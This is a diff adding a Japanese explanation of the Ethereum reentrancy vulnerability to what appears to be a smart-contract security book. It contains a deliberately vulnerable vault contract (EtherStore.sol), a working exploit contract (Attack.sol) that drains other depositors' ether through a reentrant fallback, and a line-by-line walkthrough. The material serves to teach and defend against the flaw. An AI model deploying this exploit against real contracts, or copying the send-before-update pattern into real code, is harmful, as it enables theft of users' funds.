@@ -33,7 +33,106 @@ Ethereumのスマートコントラクトの特徴の１つは他の外部コン
 
 === 脆弱性
 
-この攻撃の種類はあるコントラクトが知らないアドレスにetherを送るときに発生する。攻撃者はfallback関数内に悪意のあるコードを含む外部アドレスでコントラクトを構築します。したがってあるコントラクトがこのアドレスにetherを送ると、悪意のあるコードが呼び出されます。
+この攻撃の種類はあるコントラクトが知らないアドレスにetherを送るときに発生する。攻撃者はfallback関数内に悪意のあるコードを含む外部アドレスでコントラクトを構築します。したがってあるコントラクトがこのアドレスにetherを送ると、悪意のあるコードが呼び出されます。Reentrancyという言葉は外部の悪意のあるコントラクトが脆弱性のあるコントラクト内の関数を呼び出し、コードの実行のパスがそれにreentersする事実に由来しています。
+
+週に１etherを預金者が引き出すことのできるEthereumの金庫のような以下の脆弱性のあるコントラクトを見てみましょう。
+
+.EtherStore.sol
+====
+[source, Javascript]
+--------
+contract EtherStore {
+
+    uint256 public withdrawalLimit = 1 ether;
+    mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) public balances;
+
+    function depositFunds() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds (uint256 _weiToWithdraw) public {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        // limit the withdrawal
+        require(_weiToWithdraw <= withdrawalLimit);
+        // limit the time allowed to withdraw
+        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+        require(msg.sender.call.value(_weiToWithdraw)());
+        balances[msg.sender] -= _weiToWithdraw;
+        lastWithdrawTime[msg.sender] = now;
+    }
+ }
+--------
+====
+
+このコントラクトにはdepositFundsとwithdrawFundsという２つのpublicな関数があります。depositFunds関数は単純に送信者の残高を増加させます。withdrawFunds関数は送信者が出金するweiの量を指定できます。この関数は指定された出金量が1etherよりも少なく、ここ１週間以内に出金されていなければ意図したとおり動作し成功します。
+
+脆弱性はコントラクトがユーザーに指定された量のetherを送る17行目にあります。次の攻撃者が作成したコントラクトを見てみましょう。
+
+.Attack.sol
+====
+[source, Javascript]
+-------
+import "EtherStore.sol";
+
+contract Attack {
+  EtherStore public etherStore;
+
+  // intialize the etherStore variable with the contract address
+  constructor(address _etherStoreAddress) {
+      etherStore = EtherStore(_etherStoreAddress);
+  }
+
+  function attackEtherStore() public payable {
+      // attack to the nearest ether
+      require(msg.value >= 1 ether);
+      // send eth to the depositFunds() function
+      etherStore.depositFunds.value(1 ether)();
+      // start the magic
+      etherStore.withdrawFunds(1 ether);
+  }
+
+  function collectEther() public {
+      msg.sender.transfer(this.balance);
+  }
+
+  // fallback function - where the magic happens
+  function () payable {
+      if (etherStore.balance > 1 ether) {
+          etherStore.withdrawFunds(1 ether);
+      }
+  }
+}
+-------
+====
+
+まず攻撃者はconstructorのパラメータにEtherStoreのアドレスを入れて悪意のあるコントラクトを生成します。これによってpublic変数のetherstoreがコントラクトと紐付いて初期化されます。
+
+攻撃者がattackEtherStore関数を1ether以上で呼び出します。例えば他の多くのユーザーもこのコントラクトにetherを預金して、現在のコントラクトの残高が10etherあると想定すると、攻撃は以下の手順で行われます。
+
+1. Attack.sol, 15行目: EtherStoreコントラクトのdepositFunds関数がmsg.valueが1etherで呼ばれます。送信者は悪意のあるコントラクトです。よってコントラクトの残高は1etherになります。
+
+2. Attack.sol, 17行目: 悪意のあるコントラクトはパラメータ1etherでEtherStoreのwithdrawFunds関数を呼びます。以前に出金されていないので全ての条件を通過します。
+
+3. EtherStore.sol, 17行目: コントラクトは1etherを悪意のあるコントラクトに送ります。
+
+4. Attack.sol, 25行目: 悪意のあるコントラクトへの支払いでfallback関数を実行します。
+
+5. Attack.sol, 26行目: EtherStoreコントラクトの残高は10etherから現在9etherになります。そしてifの条件を通過します。
+
+6. Attack.sol, 27行目: EtherStoreのwithdrawFunds関数を再び呼び出し、EtherStoreコントラクトに割り込みます。
+
+7. EtherStore.sol, 11行目: withdrawFundsの２回目の呼び出しのとき、攻撃者であるコントラクトの残高は18行目が実行されてないので、まだ1etherのままです。lastWithdrawTime変数も同様にまだです。よって再び条件を通過します。
+
+8. EtherStore.sol, 17行目: 攻撃者のコントラクトは他のユーザーの1etherを引き出します。
+
+9. 4-8のステップをAttack.solの26行目"EtherStore.balance > 1"を満たしている間繰り返します。
+
+10. Attack.sol, 26行目: EtherStoreコントラクトの残高が残り1ether以下になったとき、ifの条件を満たさなくなります。そのときEtherStoreコントラクトの18, 19行目がそれぞれのwithdrawFunds関数の呼び出しに対して実行されます。
+
+11. EtherStore.sol, 18, 19行目: balanceとlastWithdrawTimeに値が入り、実行が終了します。
+
+最終的な結果、攻撃者は１つのトランザクションでEtherStoreコントラクトから1ether以外すべて引き出したことになる。
 
 
 == 算術オーバーフローとアンダーフロー
